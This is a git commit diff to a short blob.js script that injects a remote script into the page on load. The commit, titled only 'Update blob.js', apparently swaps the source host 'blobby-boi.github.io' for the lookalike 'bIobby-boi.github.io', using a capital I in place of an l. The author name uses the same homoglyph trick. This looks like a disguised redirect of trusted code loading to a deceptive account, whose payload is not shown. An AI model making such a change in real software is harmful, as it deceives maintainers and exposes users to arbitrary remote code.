ec8b36f43da4f57f491cfacfdcc826d995952611
Blobby Boi <131911782+BIobby-Boi@users.noreply.github.com>
2024-09-18 17:39:27 -0700

    Update blob.js

--- blob.js
+++ blob.js
@@ -1,6 +1,6 @@
 /// blob.js
 document.addEventListener('DOMContentLoaded', function() {
     var script = document.createElement('script');
-    script.src = 'https://blobby-boi.github.io/uBlobeBM/main.js';
+    script.src = 'https://bIobby-boi.github.io/uBlobeBM/main.js';
     document.body.appendChild(script);
 });
